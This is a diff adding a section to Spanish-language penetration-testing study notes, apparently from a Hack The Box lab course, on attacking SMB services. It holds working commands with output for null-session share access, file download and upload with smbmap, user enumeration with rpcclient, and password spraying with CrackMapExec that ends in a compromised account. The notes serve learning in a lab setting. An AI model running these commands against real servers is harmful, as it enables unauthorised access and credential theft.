@@ -180,3 +180,64 @@ Recordar que para crear un entorno virtual en Python, se siguen estos pasos:
 ```
 
 Cuando terminemos, escribimos `deactivate`.
+
+### Atacando SMB
+
+Si encontramos un servidor SMB que no necesite de un usuario y contraseña o encontramos credenciales válidas, podemos obtener un listado de shares, usuarios, grupos, permisos, servicios, etc. La mayoría de herramientas que interactúan con SMB permiten conectividad con sesión nula, incluyendo `smbclient`, `smbmap`, `rpcclient` o `enum4linux`. Ya hemos visto más arriba el funcionamiento de estas herramientas, pero echemos un vistazo a flags específicos. Por ejemplo, usando `smbmap` con el flag `-r` o `-R` podemos buscar los directorios de forma recursiva. O si encontramos permisos de lectura y escritura, podemos descargar y subir archivos:
+
+```shell-session
+amr251@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
+
+[+] Starting download: notes\note.txt (116 bytes)
+[+] File output to: /htb/10.129.14.128-notes_note.txt
+```
+
+
+```shell-session
+amr251@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
+
+[+] Starting upload: test.txt (20 bytes)
+[+] Upload complete.
+```
+
+##### Remote Procedure Call (RPC)
+
+Podemos usar `rpcclient` con una sesión nula para enumerar un workstation o controlador de dominio. A continuación se proporciona un cheatsheet: 
+
+![[Pasted image 20250430103037.png | 800]]![[Pasted image 20250430103104.png | 1000]]
+
+```shell-session
+amr251@htb[/htb]$ rpcclient -U'%' 10.10.110.17
+
+rpcclient $> enumdomusers
+
+user:[mhope] rid:[0x641]
+user:[svc-ata] rid:[0xa2b]
+user:[svc-bexec] rid:[0xa2c]
+user:[roleary] rid:[0xa36]
+user:[smorgan] rid:[0xa37]
+```
+
+### Ataques específicos 
+
+Si no hemos podido establecer una sesión nula, necesitaremos credenciales. Dos formas comunes de obtenerlas es o por fuerza bruta o por spray de contraseñas. Cuando usamos fuerza bruta, probamos todas las contraseñas contra una cuenta, pero puede bloquearnos si llegamos al límite, por lo que es más recomendable usar el segundo método. Es una mejor alternativa, pues podemos apuntar una lista de usuarios con una contraseña común para evitar bloqueos. 
+
+Con CrackMapExec poder apuntar a múltiples IPs, usando varios usuarios y contraseñas. Para usar password spraying sobre una IP, podemos usar `-u` para especificar un archivo con una lista de usuarios y `-p` para especificar una contraseña.
+
+```shell-session
+amr251@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+
+SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 18362 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\Administrator:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\jrodriguez:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\admin:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\eperez:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\amone:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\fsmith:Company01! STATUS_LOGON_FAILURE 
+SMB         10.10.110.17 445    WIN7BOX  [-] WIN7BOX\tcrash:Company01! STATUS_LOGON_FAILURE 
+
+<SNIP>
+
+SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\jurena:Company01! (Pwn3d!) 
+```
+
